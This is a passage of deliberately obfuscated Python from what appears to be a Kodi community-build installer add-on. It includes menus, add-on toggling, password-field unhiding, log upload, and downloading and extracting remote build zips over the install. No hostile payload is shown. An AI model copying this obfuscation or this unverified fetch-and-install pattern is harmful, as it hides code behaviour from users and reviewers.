  xbmc . log ( "### startup.xml and temporary startup.xml exists, attempting remove of original and replace with temp" )
  os . remove ( I11iii1Ii )
  xbmc . log ( "### removal ok" )
 if os . path . exists ( os . path . join ( iiI1IiI , 'ti_id' , 'startup.xml' ) ) :
  os . rename ( os . path . join ( iiI1IiI , 'ti_id' , 'startup.xml' ) , I11iii1Ii )
  xbmc . log ( "### rename ok" )
  if 54 - 54: IIi - IIi * O0 / O00OOo00oo0o + I1IiiI - IIi
 if O0i1I11I == 1 :
  OoooOOo0oOO ( )
  if 58 - 58: OoooooooOO * i1IIi * OoOoOO00
  if 99 - 99: Oo0Ooo
def OO0o0 ( url ) :
 Ii1I1Ii ( 'folder' , '[COLOR=darkcyan]DELETE A BUILD[/COLOR]' , url , 'delete_profile' , '' , '' , '' )
 for ooo0O in os . listdir ( II ) :
  if ooo0O != 'Master' and ooo0O != url . replace ( ' ' , '_' ) . replace ( "'" , '' ) . replace ( ':' , '-' ) :
   Ii1I1Ii ( '' , 'Load Profile: [COLOR=dodgerblue]' + ooo0O . replace ( '_' , ' ' ) + '[/COLOR]' , ooo0O , 'switch_profile' , '' , '' , '' , '' )
   if 96 - 96: i1IIi - IIi * I1IiiI % I1IiiI
   if 31 - 31: I1ii11iIi11i . O00OOo00oo0o / iiiiiiii1 / i11iIiiIii % o0oOOo0O0Ooo
def oOo00Ooo0o0 ( heading , anounce ) :
 class o00ooOOo0ooO0 ( ) :
  WINDOW = 10147
  CONTROL_LABEL = 1
  CONTROL_TEXTBOX = 5
  def __init__ ( self , * args , ** kwargs ) :
   xbmc . executebuiltin ( "ActivateWindow(%d)" % ( self . WINDOW , ) )
   self . win = xbmcgui . Window ( self . WINDOW )
   xbmc . sleep ( 500 )
   self . setControls ( )
  def setControls ( self ) :
   self . win . getControl ( self . CONTROL_LABEL ) . setLabel ( heading )
   try :
    IIiI1i = open ( anounce ) ; I11i1I1 = IIiI1i . read ( )
   except :
    I11i1I1 = anounce
   self . win . getControl ( self . CONTROL_TEXTBOX ) . setText ( str ( I11i1I1 ) )
   return
 o00ooOOo0ooO0 ( )
 while xbmc . getCondVisibility ( 'Window.IsVisible(10147)' ) :
  xbmc . sleep ( 500 )
  if 5 - 5: OoooooooOO - IIiIi1iI - i11iIiiIii
  if 53 - 53: IIiIi1iI * OoO0O00 / I1ii11iIi11i + I1IiiI + OoooooooOO
def iIi11111i1II ( url ) :
 try :
  ooooo , I11i1I1 = url . split ( '|' )
  oOo00Ooo0o0 ( ooooo , I11i1I1 )
 except :
  oOo00Ooo0o0 ( '' , url )
  if 67 - 67: i11iIiiIii . iiiiiiii1 / iIii1I11I1II1 % O00OOo00oo0o * ooOo - O0
  if 100 - 100: OoooooooOO / Oo0Ooo - O00OOo00oo0o . OOOoOoo0O / OoooooooOO - OOOoOoo0O
def iiiII ( ) :
 O00O0O = time . time ( )
 iI1I = time . localtime ( O00O0O )
 return time . strftime ( '%Y%m%d%H%M%S' , iI1I )
 if 70 - 70: ooOo - i11iIiiIii
 if 37 - 37: IIiiiI1iIII % O00OOo00oo0o % i1IIi
def i1Iii1ii ( id , value ) :
 iiII = os . path . join ( II11iiii1Ii , id , 'addon.xml' )
 if os . path . exists ( iiII ) :
  IIiI1i = open ( iiII )
  OO0OOoo0OOO = IIiI1i . read ( ) . replace ( '\n' , '' ) . replace ( '\r' , '' ) . replace ( '\t' , '' )
  o0OO000ooOo = re . compile ( '<addo.+?id="(.+?)".+?>' ) . findall ( OO0OOoo0OOO )
  xbmc . log ( '### ADDON ID TO STOP: %s' % o0OO000ooOo [ 0 ] )
  OOo = re . compile ( '<extension point=.+?ibrary="(.+?)".+?start="' ) . findall ( OO0OOoo0OOO )
  if len ( OOo ) > 0 :
   xbmc . executebuiltin ( 'StopScript(%s)' % o0OO000ooOo [ 0 ] )
 OO00OO0o0 = '{"jsonrpc":"2.0", "method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}, "id":1}' % ( o0OO000ooOo [ 0 ] , value )
 oOOOooOo0O = xbmc . executeJSONRPC ( OO00OO0o0 )
 xbmc . log ( str ( OO00OO0o0 ) )
 xbmc . log ( str ( oOOOooOo0O ) )
 if 'error' in oOOOooOo0O :
  oOoI1i11Iii1I1I1 = 'Enabling' if value == 'true' else 'Disabling'
  iI111I11I1I1 . ok ( "Community Portal" , "Error %s [COLOR yellow]%s[/COLOR]" % ( oOoI1i11Iii1I1I1 , id ) , "Check to make sure the addon list is upto date and try again." )
  iiIiii1IIIII ( )
  if 27 - 27: OoOoOO00 % O00OOo00oo0o / i1IIi . i1IIi * OoooooooOO % iiiiiiii1
  if 92 - 92: O00OOo00oo0o - iiiiiiii1 / iiiiiiii1 + IIiiiI1iIII
def O00o0OO0O ( ) :
 Ii1I1Ii ( 'folder' , 'Add-on Tools' , 'none' , 'tools_addons' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Backup/Restore' , 'none' , 'backup_restore' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Clean up my Kodi' , '' , 'tools_clean' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Misc. Tools' , '' , 'tools_misc' , 'mainmenu/maintenance.png' , '' , '' , '' )
 if IioO0O ( ) :
  Ii1I1Ii ( '' , '[COLOR=dodgerblue]Wi-Fi / OpenELEC Settings[/COLOR]' , '' , 'openelec_settings' , 'mainmenu/maintenance.png' , '' , '' , '' )
  if 100 - 100: IIi - i1IIi
  if 90 - 90: O00OOo00oo0o + ooOo . II111iiii - OoOoOO00 % iIii1I11I1II1
def i111I ( ) :
 Ii1I1Ii ( '' , 'Completely Remove An Add-on (inc. passwords)' , 'plugin' , 'addon_removal_menu' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Delete Addon Data' , 'url' , 'remove_addon_data' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Enable/Disable Addons' , 'true' , 'enableaddons' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Make Add-ons Gotham/Helix Compatible' , 'none' , 'gotham' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Make Skins Kodi (Helix) Compatible' , 'none' , 'helix' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Passwords - Hide when typing in' , 'none' , 'hide_passwords' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Passwords - Unhide when typing in' , 'none' , 'unhide_passwords' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Update My Add-ons (Force Refresh)' , 'none' , 'update' , 'mainmenu/maintenance.png' , '' , '' , '' )
 if 33 - 33: Oo
 if 22 - 22: O0 + Oo % i1IIi
def oo00oo ( ) :
 Ii1I1Ii ( '' , '[COLOR=gold]CLEAN MY KODI FOLDERS (Save Space)[/COLOR]' , '' , 'full_clean' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Clear All Cache Folders' , 'url' , 'clear_cache' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Clear Cached Artwork (thumbnails & textures)' , 'none' , 'remove_textures' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Clear Packages Folder' , 'url' , 'remove_packages' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Delete Old Builds/Zips From Device' , 'url' , 'remove_build' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Delete Old Crash Logs' , 'url' , 'remove_crash_logs' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Wipe My Install (Fresh Start)' , '' , 'wipe_xbmc' , 'mainmenu/maintenance.png' , '' , '' , '' )
 if 57 - 57: Oo * OoO0O00 + O0 % IIi - I1IiiI
 if 43 - 43: IIi
def IiiIIiIii ( ) :
 iiI = iii1i1III ( )
 Ii1I1Ii ( '' , 'Check For Special Characters In Filenames' , '' , 'ASCII_Check' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Check My Internet Speed' , 'none' , 'speedtest_menu' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Check My IP Address' , 'none' , 'ipcheck' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Check XBMC/Kodi Version' , 'none' , 'xbmcversion' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Convert Physical Paths To Special' , iIii1 , 'fix_special' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Force Close Kodi' , 'url' , 'kill_xbmc' , 'mainmenu/maintenance.png' , '' , '' , '' )
 if Oo0oO0ooo . replace ( '%20' , ' ' ) in iiI and Oo0oO0ooo != '' :
  Ii1I1Ii ( '' , 'Remove Community Build Protection' , 'none' , 'remove_nag' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Upload Log' , 'none' , 'uploadlog' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'View My Log' , 'none' , 'log' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'XXX - Hide my adult add-ons' , 'false' , 'adult_filter' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'XXX - Show my adult add-ons' , 'true' , 'adult_filter' , 'mainmenu/maintenance.png' , '' , '' , '' )
 if 66 - 66: OOOoOoo0O
 if 9 - 9: I1ii11iIi11i * O00OOo00oo0o
def IIIIII ( ) :
 iI111I11I1I1 = xbmcgui . Dialog ( )
 if iI111I11I1I1 . yesno ( "Make Add-on Passwords Visible?" , "This will make all your add-on passwords visible in the add-on settings. Are you sure you wish to continue?" ) :
  for IIIiiiiiI1I , I1III111i , iiI1iii in os . walk ( II11iiii1Ii ) :
   for IIiI1i in iiI1iii :
    if IIiI1i == 'settings.xml' :
     oO0o0OoOOOO00o0 = open ( os . path . join ( IIIiiiiiI1I , IIiI1i ) ) . read ( )
     o0OO000ooOo = re . compile ( '<setting id=(.+?)>' ) . findall ( oO0o0OoOOOO00o0 )
     for O0ooo0 in o0OO000ooOo :
      if 'pass' in O0ooo0 :
       if 'option="hidden"' in O0ooo0 :
        try :
         o00O00oO = O0ooo0 . replace ( ' option="hidden"' , '' )
         IIiI1i = open ( os . path . join ( IIIiiiiiI1I , IIiI1i ) , mode = 'w' )
         IIiI1i . write ( str ( oO0o0OoOOOO00o0 ) . replace ( O0ooo0 , o00O00oO ) )
         IIiI1i . close ( )
        except :
         pass
  iI111I11I1I1 . ok ( "Passwords Are now visible" , "Your passwords will now be visible in your add-on settings. If you want to undo this please use the option to hide passwords." )
  if 22 - 22: OoOoOO00
  if 49 - 49: ooOo
def o0o000OOO ( name , url , video , description , skins , guisettingslink , artpack ) :
 OOooO0OOoo . create ( "Backing Up Important Data" , 'Please wait...' , '' , '' )
 if 36 - 36: IIi * IIi % I1IiiI % O0 . I1IiiI % OoooooooOO
 if 96 - 96: ooOo % iIii1I11I1II1 / iIii1I11I1II1 . IIiIi1iI . O00OOo00oo0o
 iII1I1iIIIiII = open ( O000oo0O , mode = 'r' )
 I11i1II1i = iII1I1iIIIiII . read ( )
 iII1I1iIIIiII . close ( )
 if 86 - 86: OoO0O00
 Ii11II1 = re . compile ( 'gui="(.+?)"' ) . findall ( I11i1II1i )
 iIi1ii1I1iiI = Ii11II1 [ 0 ] if ( len ( Ii11II1 ) > 0 ) else '0'
 if 21 - 21: IIiiiI1iIII * ooOo
 if 92 - 92: I1ii11iIi11i - Oo0Ooo + OoO0O00 * OoO0O00
 if i1i1II == 'true' :
  try :
   i111i = open ( ooooooO0oo , mode = 'r' )
   iII1I1i11iIi = i111i . read ( )
   i111i . close ( )
   if 89 - 89: o0oOOo0O0Ooo / Oo % iIii1I11I1II1 - I1IiiI . ooOo + OoOoOO00
  except :
   xbmc . log ( "### No favourites file to copy" )
   if 94 - 94: o0oOOo0O0Ooo % o0oOOo0O0Ooo % II111iiii * iIii1I11I1II1 / IIiiiI1iIII . I1ii11iIi11i
 if O0oo0OO0 == 'true' :
  try :
   IIiIiI1III1 = open ( IIiiiiiiIi1I1 , mode = 'r' )
   iiiiII1i1Iii1I1 = IIiIiI1III1 . read ( )
   IIiIiI1III1 . close ( )
   if 87 - 87: OoooooooOO - ooOo - iiiiiiii1 * I1ii11iIi11i
  except :
   xbmc . log ( "### No sources file to copy" )
   if 44 - 44: ooOo * II111iiii * II111iiii + I1IiiI / Oo0Ooo
 ooo0o0oO = 1
 oOO0OOOOOo0Oo ( )
 if 9 - 9: Oo0Ooo - IIiiiI1iIII
 if 30 - 30: OoooooooOO % Oo
 if os . path . exists ( ooOooo000oOO ) :
  if 14 - 14: OoOoOO00 / OoO0O00 / i11iIiiIii - OoOoOO00 / o0oOOo0O0Ooo - Oo
  if os . path . exists ( iIi1ii1I1 ) :
   os . remove ( ooOooo000oOO )
   if 81 - 81: IIiIi1iI % O00OOo00oo0o . iiiiiiii1
  else :
   os . rename ( ooOooo000oOO , iIi1ii1I1 )
   if 66 - 66: I1ii11iIi11i * O00OOo00oo0o / OoooooooOO * O0 % Oo
 if os . path . exists ( o0 ) :
  os . remove ( o0 )
  if 49 - 49: II111iiii . I1IiiI * O0 * O00OOo00oo0o / IIi * OoooooooOO
  if 82 - 82: Oo0Ooo / O00OOo00oo0o / O00OOo00oo0o % O00OOo00oo0o
 if not os . path . exists ( I1IIiiIiii ) :
  I1I1IIiiii1ii = open ( I1IIiiIiii , mode = 'w+' )
  I1I1IIiiii1ii . close ( )
  if 20 - 20: iiiiiiii1
 OOooO0OOoo . close ( )
 OOooO0OOoo . create ( "Downloading Skin Fix" , "Downloading guisettings.xml" , '' , 'Please Wait' )
 OOOoooOo00O = os . path . join ( iiiiiIIii , 'guifix.zip' )
 if 63 - 63: iIii1I11I1II1 . OoO0O00
 if 100 - 100: i1IIi * i1IIi
 try :
  xbmc . log ( "### attempting to download guisettings.xml" )
  downloader . download ( guisettingslink , OOOoooOo00O , OOooO0OOoo )
  OOooO0OOoo . close ( )
 except :
  iI111I11I1I1 . ok ( 'Problem Detected' , 'Sorry there was a problem downloading the guisettings file. Please check your storage location, if you\'re certain that\'s ok please notify the build author on the relevant support thread.' )
  xbmc . log ( "### FAILED to download %s" % guisettingslink )
  if 26 - 26: Oo . OoO0O00 % OoOoOO00
  if 94 - 94: IIiiiI1iIII
 if zipfile . is_zipfile ( OOOoooOo00O ) :
  oOoO0oOO0o = str ( os . path . getsize ( OOOoooOo00O ) )
  if 15 - 15: O00OOo00oo0o - IIiiiI1iIII / O0
 else :
  oOoO0oOO0o = iIi1ii1I1iiI
  if 28 - 28: IIi . i1IIi / I1ii11iIi11i
  if 77 - 77: i11iIiiIii / IIi / i11iIiiIii % OoOoOO00 - IIi
 I1I1IIiiii1ii = open ( I1IIiiIiii , mode = 'r' )
 ii1I1 = I1I1IIiiii1ii . read ( )
 I1I1IIiiii1ii . close ( )
 if 80 - 80: IIi % OoOoOO00 . OoooooooOO . II111iiii % IIiiiI1iIII
 I111I = re . compile ( 'id="(.+?)"' ) . findall ( ii1I1 )
 oooOoo0OOoOo0 = re . compile ( 'name="(.+?)"' ) . findall ( ii1I1 )
 oO00oO0 = re . compile ( 'version="(.+?)"' ) . findall ( ii1I1 )
 if 6 - 6: IIi % IIiiiI1iIII / O00OOo00oo0o + IIi . ooOo
 o0o = I111I [ 0 ] if ( len ( I111I ) > 0 ) else ''
 I1Iii = oooOoo0OOoOo0 [ 0 ] if ( len ( oooOoo0OOoOo0 ) > 0 ) else ''
 I1IiII1I1i1I1 = oO00oO0 [ 0 ] if ( len ( oO00oO0 ) > 0 ) else ''
 if 70 - 70: iIii1I11I1II1 / O00OOo00oo0o
 if os . path . exists ( Oo0oOOo ) :
  os . removedirs ( Oo0oOOo )
  if 61 - 61: O0 * o0oOOo0O0Ooo + IIi - Oo . I1IiiI - IIiiiI1iIII
  if 7 - 7: I1ii11iIi11i
 if iIi1ii1I1iiI != oOoO0oOO0o :
  try :
   os . rename ( iIi1ii1I1 , ooOooo000oOO )
   if 81 - 81: Oo0Ooo % II111iiii % o0oOOo0O0Ooo / OOOoOoo0O
  except :
   iI111I11I1I1 . ok ( "NO GUISETTINGS!" , 'No guisettings.xml file has been found.' , 'Please exit Kodi and try again' , '' )
   return
   if 95 - 95: OoOoOO00 - O0 % OoooooooOO
   if 13 - 13: i11iIiiIii
 if video != 'fresh' :
  I1i1I1I11IiiI = xbmcgui . Dialog ( ) . yesno ( name , 'We highly recommend backing up your existing build before installing any community builds. Would you like to perform a backup first?' , nolabel = 'Backup' , yeslabel = 'Install' )
  if 54 - 54: Oo . I1ii11iIi11i * OOOoOoo0O % IIi . O0 * IIiiiI1iIII
  if I1i1I1I11IiiI == 0 :
   Ii1111i11 = xbmc . translatePath ( os . path . join ( iiiiiIIii , 'Community_Builds' , 'My_Builds' ) )
   if 87 - 87: O00OOo00oo0o % I1ii11iIi11i * Oo0Ooo
   if not os . path . exists ( Ii1111i11 ) :
    os . makedirs ( Ii1111i11 )
    if 59 - 59: Oo0Ooo / OOOoOoo0O - iIii1I11I1II1 * iIii1I11I1II1
   I1iII1IIi1IiI = iIioo0ooO ( heading = "Enter a name for this backup" )
   if 18 - 18: OOOoOoo0O * I1ii11iIi11i / i11iIiiIii / iIii1I11I1II1 * OoooooooOO . Oo
   if ( not I1iII1IIi1IiI ) :
    return False , 0
    if 69 - 69: Oo0Ooo * iiiiiiii1
   o00OO0o0 = urllib . quote_plus ( I1iII1IIi1IiI )
   i1II1IiiIi = xbmc . translatePath ( os . path . join ( Ii1111i11 , o00OO0o0 + '.zip' ) )
   ii111iI1i1 = [ 'plugin.program.totalinstaller' , 'plugin.program.tbs' ]
   OO000 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'Thumbs.db' , '.gitignore' ]
   oO0oOoo0O = "Creating full backup of existing build"
   II1iI11 = "Archiving..."
   O00o0O = ""
   O00oOo0O0o00O = "Please Wait"
   iiIIii ( iIii1 , i1II1IiiIi , oO0oOoo0O , II1iI11 , O00o0O , O00oOo0O0o00O , ii111iI1i1 , OO000 )
   if 91 - 91: o0oOOo0O0Ooo . iiiiiiii1 / OoO0O00 / i11iIiiIii * o0oOOo0O0Ooo
 OooooOOoo0 = open ( O000oo0O , mode = 'w+' )
 if 52 - 52: I1IiiI - i11iIiiIii / IIiiiI1iIII . ooOo
 if iIi1ii1I1iiI != oOoO0oOO0o :
  OooooOOoo0 . write ( 'id="' + str ( o0o ) + '"\nname="' + I1Iii + ' [COLOR=yellow](Partially installed)[/COLOR]"\nversion="' + I1IiII1I1i1I1 + '"\ngui="' + oOoO0oOO0o + '"' )
  if 38 - 38: ooOo + OoooooooOO * OoOoOO00 % ooOo
 else :
  OooooOOoo0 . write ( 'id="' + str ( o0o ) + '"\nname="' + I1Iii + '"\nversion="' + I1IiII1I1i1I1 + '"\ngui="' + oOoO0oOO0o + '"' )
 OooooOOoo0 . close ( )
 if 91 - 91: i1IIi - I1ii11iIi11i * I1IiiI
 if 24 - 24: OoOoOO00 * O00OOo00oo0o
 if video == 'libprofile' or video == 'library' or video == 'updatelibprofile' or video == 'updatelibrary' :
  try :
   shutil . copytree ( O0OoO000O0OO , Oo0OoO00oOO0o , symlinks = False , ignore = shutil . ignore_patterns ( "Textures13.db" , "Addons16.db" , "Addons15.db" , "saltscache.db-wal" , "saltscache.db-shm" , "saltscache.db" , "onechannelcache.db" ) )
   if 17 - 17: OoO0O00 . I1IiiI * O0
  except :
   ooo0o0oO = xbmcgui . Dialog ( ) . yesno ( name , 'There was an error trying to backup some databases. Continuing may wipe your existing library. Do you wish to continue?' , nolabel = 'No, cancel' , yeslabel = 'Yes, overwrite' )
   if 81 - 81: Oo
   if ooo0o0oO == 0 :
    return
    if 58 - 58: II111iiii . IIi . O00OOo00oo0o * OoooooooOO / O00OOo00oo0o / OOOoOoo0O
  i1II1IiiIi = xbmc . translatePath ( os . path . join ( iiiiiIIii , 'Database.zip' ) )
  oo ( Oo0OoO00oOO0o , i1II1IiiIi )
  if 41 - 41: OOOoOoo0O + OoO0O00 . IIiIi1iI
 if ooo0o0oO == 0 :
  return
  if 73 - 73: i11iIiiIii * I1IiiI + o0oOOo0O0Ooo / ooOo
 time . sleep ( 1 )
 if 56 - 56: i1IIi
 if 11 - 11: i11iIiiIii % o0oOOo0O0Ooo / OOOoOoo0O * OoooooooOO
 oo00OoO00O0O = xbmc . translatePath ( os . path . join ( iIii1 , '..' , 'koditemp.zip' ) )
 time . sleep ( 2 )
 OOooO0OOoo . create ( "Community Builds" , "Downloading " + description + " build." , '' , 'Please Wait' )
 ooooOoo00 = description . replace ( ' ' , '_' ) . replace ( ':' , '-' ) . replace ( "'" , '' )
 OOOoooOo00O = os . path . join ( O000OO0 , ooooOoo00 + '.zip' )
 if 54 - 54: i11iIiiIii / iIii1I11I1II1 % I1ii11iIi11i / I1IiiI . iIii1I11I1II1 / IIiIi1iI
 if not os . path . exists ( O000OO0 ) :
  os . makedirs ( O000OO0 )
  if 1 - 1: IIi / OoOoOO00 * OoOoOO00 - o0oOOo0O0Ooo % O00OOo00oo0o
 downloader . download ( url , OOOoooOo00O , OOooO0OOoo )
 if 96 - 96: IIiiiI1iIII / O00OOo00oo0o % OoO0O00 . iIii1I11I1II1
 if 30 - 30: OOOoOoo0O - OoO0O00
 try :
  iiiiOo000O00o0O = open ( oOoOooOo0o0 , mode = 'r' )
  o0o0oo0oO = iiiiOo000O00o0O . read ( )
  iiiiOo000O00o0O . close ( )
 except :
  xbmc . log ( "### No profiles detected, most likely a fresh wipe performed" )
  if 6 - 6: i11iIiiIii + OoooooooOO % i11iIiiIii . OOOoOoo0O * OoooooooOO - Oo0Ooo
 OOooO0OOoo . close ( )
 OOooO0OOoo . create ( "Community Builds" , "Checking " , '' , 'Please Wait' )
 if 88 - 88: ooOo
 if 33 - 33: o0oOOo0O0Ooo / i1IIi
 if zipfile . is_zipfile ( OOOoooOo00O ) :
  OOooO0OOoo . update ( 0 , "" , "Extracting Zip Please Wait" )
  extract . all ( OOOoooOo00O , iIii1 , OOooO0OOoo )
  if 71 - 71: OoooooooOO - IIiIi1iI + O00OOo00oo0o / O0 % o0oOOo0O0Ooo + OoO0O00
 else :
  iI111I11I1I1 . ok ( 'Not a valid zip file' , 'This file is not a valid zip file, please let the build author know on their support thread so they can amend the download path. It\'s most likely just a simple typo on their behalf.' )
  return
  if 83 - 83: IIiiiI1iIII * I1ii11iIi11i / IIiiiI1iIII * IIiiiI1iIII - Oo
 OOooO0OOoo . create ( "Restoring Dependencies" , "Checking " , '' , 'Please Wait' )
 OOooO0OOoo . update ( 0 , "" , "Extracting Zip Please Wait" )
 if 89 - 89: OoO0O00 % OOOoOoo0O
 if i1i1II == 'true' :
  try :
   xbmc . log ( "### Attempting to add back favourites ###" )
   OooooOOoo0 = open ( ooooooO0oo , mode = 'w+' )
   OooooOOoo0 . write ( iII1I1i11iIi )
   OooooOOoo0 . close ( )
   OOooO0OOoo . update ( 0 , "" , "Copying Favourites" )
  except :
   xbmc . log ( "### Failed to copy back favourites" )
   if 51 - 51: iiiiiiii1 * O00OOo00oo0o * OoooooooOO % OoOoOO00
 if O0oo0OO0 == 'true' :
  try :
   xbmc . log ( "### Attempting to add back sources ###" )
   OooooOOoo0 = open ( IIiiiiiiIi1I1 , mode = 'w+' )
   OooooOOoo0 . write ( iiiiII1i1Iii1I1 )
   OooooOOoo0 . close ( )
   OOooO0OOoo . update ( 0 , "" , "Copying Sources" )
   if 25 - 25: iIii1I11I1II1 * OoooooooOO * O00OOo00oo0o - i1IIi
  except :
   xbmc . log ( "### Failed to copy back sources" )
   if 23 - 23: o0oOOo0O0Ooo . iiiiiiii1 - OoooooooOO + OOOoOoo0O
 time . sleep ( 1 )
 if os . path . exists ( Oo0OoO00oOO0o ) :
  shutil . rmtree ( Oo0OoO00oOO0o )
  if 73 - 73: OoOoOO00
  if 71 - 71: i11iIiiIii * OoOoOO00 * Oo + ooOo + Oo0Ooo
 if os . path . exists ( I11iii1Ii ) :
  I1I1IIiiii1ii = open ( I11iii1Ii , mode = 'r' )
  ii1I1 = I1I1IIiiii1ii . read ( )
  I1I1IIiiii1ii . close ( )
  iiI1iI = re . compile ( 'version="[\s\S]*?"' ) . findall ( ii1I1 )
  iiI111I1iIiI = iiI1iI [ 0 ] if ( len ( iiI1iI ) > 0 ) else ''
  OOO = ii1I1 . replace ( iiI111I1iIiI , 'version="' + I1IiII1I1i1I1 + '"' )
  OooooOOoo0 = open ( I11iii1Ii , mode = 'w' )
  OooooOOoo0 . write ( str ( OOO ) )
  OooooOOoo0 . close ( )
  if 59 - 59: IIiiiI1iIII
 else :
  OooooOOoo0 = open ( I11iii1Ii , mode = 'w+' )
  OooooOOoo0 . write ( 'date="01011001"\nversion="' + I1IiII1I1i1I1 + '"' )
  OooooOOoo0 . close ( )
  if 54 - 54: Oo
  if 27 - 27: OoOoOO00 - OoO0O00 + o0oOOo0O0Ooo + iiiiiiii1 . OoO0O00
 if IiII == 'false' :
  os . remove ( OOOoooOo00O )
  if 86 - 86: II111iiii - OoooooooOO - iiiiiiii1 % IIiIi1iI
  if 16 - 16: iiiiiiii1 + Oo0Ooo + OoooooooOO
 if 'prof' in video :
  try :
   OooOooO0OoOoo0o = open ( oOoOooOo0o0 , mode = 'w+' )
   OooOooO0OoOoo0o . write ( o0o0oo0oO )
   OooOooO0OoOoo0o . close ( )
  except :
   xbmc . log ( "### Failed to write existing profile info back into profiles.xml" )
   if 27 - 27: OoO0O00 % iiiiiiii1 - O0
   if 44 - 44: I1ii11iIi11i + I1ii11iIi11i - Oo / II111iiii
 if video == 'library' or video == 'libprofile' or video == 'updatelibprofile' or video == 'updatelibrary' :
  extract . all ( i1II1IiiIi , O0OoO000O0OO , OOooO0OOoo )
  if 36 - 36: OoO0O00 - o0oOOo0O0Ooo . IIiIi1iI % IIiIi1iI
  if 12 - 12: OoOoOO00 / I1IiiI * Oo0Ooo
  if ooo0o0oO != 1 :
   shutil . rmtree ( Oo0OoO00oOO0o )
 try :
  OOooO0OOoo . close ( )
 except :
  pass
  if 59 - 59: Oo0Ooo . o0oOOo0O0Ooo % I1IiiI / OoooooooOO % ooOo
  if 81 - 81: OoooooooOO / iiiiiiii1 * iIii1I11I1II1 . Oo0Ooo + ooOo / O0
 if os . path . exists ( O00O0oOO00O00 ) :
  O0000oO0o00 ( description )
  if 84 - 84: II111iiii - o0oOOo0O0Ooo
  try :
   os . remove ( O00O0oOO00O00 )
   if 78 - 78: IIiiiI1iIII
  except :
   xbmc . log ( "###' Failed to remove: %s" % O00O0oOO00O00 )
   if 58 - 58: i11iIiiIii - OoOoOO00
  try :
   shutil . rmtree ( O0o0O00Oo0o0 )
   if 67 - 67: I1ii11iIi11i / IIiIi1iI + iIii1I11I1II1 % I1IiiI
  except :
   xbmc . log ( "###' Failed to remove: %s" % O0o0O00Oo0o0 )
   if 99 - 99: iiiiiiii1 . O00OOo00oo0o
 else :
  xbmc . log ( "### Community Builds - using an old build" )
  if 92 - 92: i1IIi
  if 68 - 68: OoO0O00 % IIiiiI1iIII - ooOo - iiiiiiii1 . Oo0Ooo
 if iIi1ii1I1iiI != oOoO0oOO0o :
  xbmc . log ( "### GUI SIZE DIFFERENT ATTEMPTING MERGE ###" )
  IiII11IIII1 = os . path . join ( iIii1 , 'newbuild' )
  if 2 - 2: OoOoOO00
  if not os . path . exists ( IiII11IIII1 ) :
   os . makedirs ( IiII11IIII1 )
   if 42 - 42: iIii1I11I1II1 . OoO0O00 % iIii1I11I1II1 * i1IIi
  os . makedirs ( Oo0oOOo )
  time . sleep ( 1 )
  OoO0ooOOoo ( guisettingslink , video )
  time . sleep ( 1 )
  OoooOOo0oOO ( )
  iI111I11I1I1 . ok ( "Force Close Required" , "If you\'re seeing this message it means the force close was unsuccessful. Please close XBMC/Kodi via your operating system or pull the power." )
  if 92 - 92: iIii1I11I1II1 * I1ii11iIi11i
 if iIi1ii1I1iiI == oOoO0oOO0o :
  iI111I11I1I1 . ok ( 'Successfully Updated' , 'Congratulations the following build:[COLOR=dodgerblue]' , description , '[/COLOR]has been successfully updated!' )
  if 5 - 5: iiiiiiii1 - IIi - IIiIi1iI
  if 38 - 38: iIii1I11I1II1 . O00OOo00oo0o
def IIIiIi1iI ( ) :
 if o0O . getSetting ( 'email' ) == '' :
  iI111I11I1I1 . ok ( "No Email Address Set" , "A new window will Now open for you to enter your Email address. The logfile will be sent here" )
  o0O . openSettings ( )
 uploadLog . Main ( )
 if 34 - 34: Oo - OoO0O00
 if 3 - 3: Oo0Ooo + Oo - I1IiiI
def OOOO00o000o ( info ) :
 if os . path . exists ( IIIii1II1II ) :
  IIiIiI = open ( IIIii1II1II , 'r' )
  ii1I1 = IIiIiI . read ( )
  IIiIiI . close ( )
  IIi1 = re . compile ( 'l="(.+?)"' ) . findall ( ii1I1 )
  ooo00o0o = IIi1 [ 0 ] if ( len ( IIi1 ) > 0 ) else ''
  Oo0oo = re . compile ( 'p="(.+?)"' ) . findall ( ii1I1 )
  ooOo0Oo = Oo0oo [ 0 ] if ( len ( Oo0oo ) > 0 ) else '0'
  if ooOo0Oo != '0' :
